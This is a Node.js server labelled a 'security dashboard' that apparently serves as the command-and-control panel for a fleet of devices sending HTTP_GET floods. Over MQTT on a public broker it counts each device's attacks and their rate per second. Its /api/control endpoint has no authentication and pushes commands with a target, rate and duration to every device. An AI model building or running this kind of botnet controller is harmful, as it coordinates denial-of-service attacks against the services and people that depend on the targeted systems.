const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const mqtt = require('mqtt');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*" },
  transports: ['websocket', 'polling']
});

// ========== MQTT CONFIGURATION ==========
const MQTT_BROKER = 'mqtt://broker.emqx.io';
const MQTT_PORT = 1883;
const ATTACK_TOPIC = 'attacks/count';
const HEARTBEAT_TOPIC = 'devices/heartbeat';
const STATUS_TOPIC = 'devices/status';

// ========== STORAGE ==========
let attackStats = {
  totalAttacks: 0,
  devices: new Map(),
  recentAttacks: [],
  attacksPerSecond: 0,
  attackHistory: []
};

let attackTimestamps = [];
let deviceTimeout = 15000;
let lastBroadcast = null;

// ========== MQTT CONNECTION ==========
const mqttClient = mqtt.connect(`${MQTT_BROKER}:${MQTT_PORT}`, {
  keepalive: 60,
  reconnectPeriod: 5000
});

mqttClient.on('connect', () => {
  console.log('✓ Connected to MQTT broker');
  mqttClient.subscribe(ATTACK_TOPIC);
  mqttClient.subscribe(HEARTBEAT_TOPIC);
  mqttClient.subscribe(STATUS_TOPIC);
  console.log('✓ Subscribed to topics');
});

mqttClient.on('error', (err) => {
  console.error('MQTT Error:', err);
});

mqttClient.on('message', (topic, message) => {
  try {
    const data = JSON.parse(message.toString());
    
    if (topic === ATTACK_TOPIC) {
      handleAttack(data);
    } else if (topic === HEARTBEAT_TOPIC) {
      handleHeartbeat(data);
    } else if (topic === STATUS_TOPIC) {
      handleStatus(data);
    }
  } catch (e) {
    console.error('Parse Error:', e.message);
  }
});

// ========== HANDLE ATTACKS ==========
function handleAttack(data) {
  const { deviceId, type, target } = data;
  const now = Date.now();
  
  attackStats.totalAttacks++;
  
  if (!attackStats.devices.has(deviceId)) {
    attackStats.devices.set(deviceId, { 
      count: 0, 
      lastSeen: now, 
      lastAttack: now,
      type: type || 'HTTP_GET',
      status: 'online',
      firstSeen: now,
      attackRate: 0
    });
    console.log(`🟢 NEW DEVICE: ${deviceId}`);
  }
  
  const device = attackStats.devices.get(deviceId);
  device.count++;
  device.lastSeen = now;
  device.lastAttack = now;
  device.status = 'online';
  device.type = type || device.type;
  
  if (!device.attackTimestamps) device.attackTimestamps = [];
  device.attackTimestamps.push(now);
  device.attackTimestamps = device.attackTimestamps.filter(ts => now - ts < 1000);
  device.attackRate = device.attackTimestamps.length;
  
  const attack = {
    id: attackStats.totalAttacks,
    deviceId,
    timestamp: now,
    time: new Date(now).toLocaleTimeString(),
    type: device.type,
    target: target || device.target || 'Unknown',
    eventType: 'attack'
  };
  
  attackStats.recentAttacks.unshift(attack);
  if (attackStats.recentAttacks.length > 200) attackStats.recentAttacks.pop();
  
  attackTimestamps.push(now);
  attackTimestamps = attackTimestamps.filter(ts => now - ts < 1000);
  attackStats.attacksPerSecond = attackTimestamps.length;
  
  attackStats.attackHistory.push({ time: now, count: attackStats.attacksPerSecond });
  if (attackStats.attackHistory.length > 60) attackStats.attackHistory.shift();
  
  broadcastUpdate(attack);
}

// ========== HANDLE HEARTBEAT ==========
function handleHeartbeat(data) {
  const { deviceId, attacksSent, uptime, rssi, target, rate, running } = data;
  const now = Date.now();
  
  let statusChanged = false;
  
  if (!attackStats.devices.has(deviceId)) {
    attackStats.devices.set(deviceId, {
      count: attacksSent || 0,
      lastSeen: now,
      lastAttack: now,
      type: 'HTTP_GET',
      status: 'online',
      firstSeen: now,
      uptime: uptime || 0,
      rssi: rssi || 0,
      target: target,
      attackRate: rate || 0,
      running: running !== undefined ? running : true
    });
    
    console.log(`🟢 NEW DEVICE (heartbeat): ${deviceId}`);
    statusChanged = true;
    
    attackStats.recentAttacks.unshift({
      deviceId,
      eventType: 'connect',
      time: new Date(now).toLocaleTimeString(),
      type: 'CONNECTION',
      target: 'Device Online',
      timestamp: now
    });
    if (attackStats.recentAttacks.length > 200) attackStats.recentAttacks.pop();
    
  } else {
    const device = attackStats.devices.get(deviceId);
    const wasOffline = device.status === 'offline';
    
    device.lastSeen = now;
    device.status = 'online';
    if (attacksSent > device.count) device.count = attacksSent;
    if (uptime) device.uptime = uptime;
    if (rssi) device.rssi = rssi;
    if (target) device.target = target;
    if (rate !== undefined) device.attackRate = rate;
    if (running !== undefined) device.running = running;
    
    if (wasOffline) {
      console.log(`🟢 Device BACK ONLINE: ${deviceId}`);
      statusChanged = true;
      
      attackStats.recentAttacks.unshift({
        deviceId,
        eventType: 'reconnect',
        time: new Date(now).toLocaleTimeString(),
        type: 'RECONNECT',
        target: 'Device Reconnected',
        timestamp: now
      });
      if (attackStats.recentAttacks.length > 200) attackStats.recentAttacks.pop();
    }
  }
  
  if (statusChanged) {
    broadcastUpdate();
  }
}

// ========== HANDLE STATUS ==========
function handleStatus(data) {
  const { deviceId, status, ip, attackRate, target, attacksSent, running } = data;
  const now = Date.now();
  
  let statusChanged = false;
  
  if (!attackStats.devices.has(deviceId)) {
    attackStats.devices.set(deviceId, {
      count: attacksSent || 0,
      lastSeen: now,
      lastAttack: now,
      type: 'HTTP_GET',
      status: 'online',
      ip: ip,
      attackRate: attackRate || 0,
      target: target,
      running: running !== undefined ? running : true,
      firstSeen: now
    });
    
    console.log(`🟢 NEW DEVICE (status): ${deviceId}`);
    statusChanged = true;
    
    attackStats.recentAttacks.unshift({
      deviceId,
      eventType: 'connect',
      time: new Date(now).toLocaleTimeString(),
      type: 'CONNECTION',
      target: 'Device Online',
      timestamp: now
    });
    if (attackStats.recentAttacks.length > 200) attackStats.recentAttacks.pop();
    
  } else {
    const device = attackStats.devices.get(deviceId);
    const wasOffline = device.status === 'offline';
    
    device.status = 'online';
    device.lastSeen = now;
    if (ip) device.ip = ip;
    if (attackRate !== undefined) device.attackRate = attackRate;
    if (target) device.target = target;
    if (attacksSent > device.count) device.count = attacksSent;
    if (running !== undefined) device.running = running;
    
    if (wasOffline) {
      console.log(`🟢 Device BACK ONLINE (status): ${deviceId}`);
      statusChanged = true;
    }
  }
  
  if (statusChanged) {
    broadcastUpdate();
  }
}

// ========== GET DEVICES LIST ==========
function getDevicesList() {
  const now = Date.now();
  const devicesList = [];
  
  for (const [id, device] of attackStats.devices.entries()) {
    const timeSinceLastSeen = now - device.lastSeen;
    const isOnline = timeSinceLastSeen <= deviceTimeout;
    
    if (!isOnline && device.status === 'online') {
      device.status = 'offline';
      console.log(`🔴 Device ${id} went OFFLINE`);
      
      attackStats.recentAttacks.unshift({
        deviceId: id,
        eventType: 'disconnect',
        time: new Date(now).toLocaleTimeString(),
        type: 'DISCONNECT',
        target: 'Connection Timeout',
        timestamp: now
      });
      if (attackStats.recentAttacks.length > 200) attackStats.recentAttacks.pop();
    }
    
    devicesList.push({
      id,
      count: device.count,
      lastSeen: device.lastSeen,
      lastAttack: device.lastAttack,
      type: device.type,
      status: isOnline ? 'online' : 'offline',
      ip: device.ip,
      attackRate: device.attackRate,
      target: device.target,
      uptime: device.uptime,
      rssi: device.rssi,
      running: device.running
    });
  }
  
  return devicesList.sort((a, b) => {
    if (a.status === 'online' && b.status !== 'online') return -1;
    if (a.status !== 'online' && b.status === 'online') return 1;
    return b.lastSeen - a.lastSeen;
  });
}

// ========== BROADCAST UPDATE ==========
function broadcastUpdate(recentAttack = null) {
  const devicesList = getDevicesList();
  const onlineCount = devicesList.filter(d => d.status === 'online').length;
  
  const updateData = {
    totalAttacks: attackStats.totalAttacks,
    attacksPerSecond: attackStats.attacksPerSecond,
    devices: devicesList,
    history: attackStats.attackHistory,
    onlineCount: onlineCount,
    timestamp: Date.now()
  };
  
  if (recentAttack) {
    updateData.recentAttack = recentAttack;
  }
  
  io.emit('attack-update', updateData);
  
  if (lastBroadcast !== onlineCount) {
    console.log(`📊 Active Nodes: ${onlineCount} | Total Attacks: ${attackStats.totalAttacks} | Rate: ${attackStats.attacksPerSecond}/s`);
    lastBroadcast = onlineCount;
  }
}

// ========== API ENDPOINTS ==========
app.use(express.json());
app.use(express.static('public'));

app.get('/api/stats', (req, res) => {
  res.json({
    totalAttacks: attackStats.totalAttacks,
    attacksPerSecond: attackStats.attacksPerSecond,
    devices: getDevicesList(),
    recentAttacks: attackStats.recentAttacks.slice(0, 100),
    history: attackStats.attackHistory
  });
});

app.post('/api/control', (req, res) => {
  const { action, target, rate, duration } = req.body;
  console.log(`📡 Control: ${action} | Target: ${target} | Rate: ${rate}`);
  
  const controlMessage = {
    command: action,
    target: target,
    rate: rate,
    duration: duration,
    timestamp: Date.now()
  };
  
  mqttClient.publish('devices/control', JSON.stringify(controlMessage), (err) => {
    if (err) {
      console.error('Failed to send command:', err);
      res.status(500).json({ error: 'Failed to send command' });
    } else {
      res.json({ success: true, message: `Command ${action} sent` });
    }
  });
});

// ========== FIXED: Catch-all route for SPA ==========
// This uses a named wildcard which works with Express 5+
app.get('/*path', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== PERIODIC DEVICE CHECK ==========
setInterval(() => {
  const now = Date.now();
  let needsUpdate = false;
  
  for (const [id, device] of attackStats.devices.entries()) {
    if (now - device.lastSeen > deviceTimeout && device.status === 'online') {
      device.status = 'offline';
      needsUpdate = true;
      console.log(`🔴 Device ${id} marked OFFLINE`);
      
      attackStats.recentAttacks.unshift({
        deviceId: id,
        eventType: 'disconnect',
        time: new Date(now).toLocaleTimeString(),
        type: 'DISCONNECT',
        target: 'Connection Timeout',
        timestamp: now
      });
      if (attackStats.recentAttacks.length > 200) attackStats.recentAttacks.pop();
    }
  }
  
  if (needsUpdate) {
    broadcastUpdate();
  }
}, 5000);

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('\n╔════════════════════════════════════════════╗');
  console.log('║     NEXUS SECURITY DASHBOARD              ║');
  console.log(`║     http://localhost:${PORT}                  ║`);
  console.log('╠════════════════════════════════════════════╣');
  console.log('║  MQTT Broker: ' + MQTT_BROKER);
  console.log('║  Device Timeout: ' + deviceTimeout/1000 + ' seconds');
  console.log('║  Status: Monitoring for devices...        ║');
  console.log('╚════════════════════════════════════════════╝\n');
});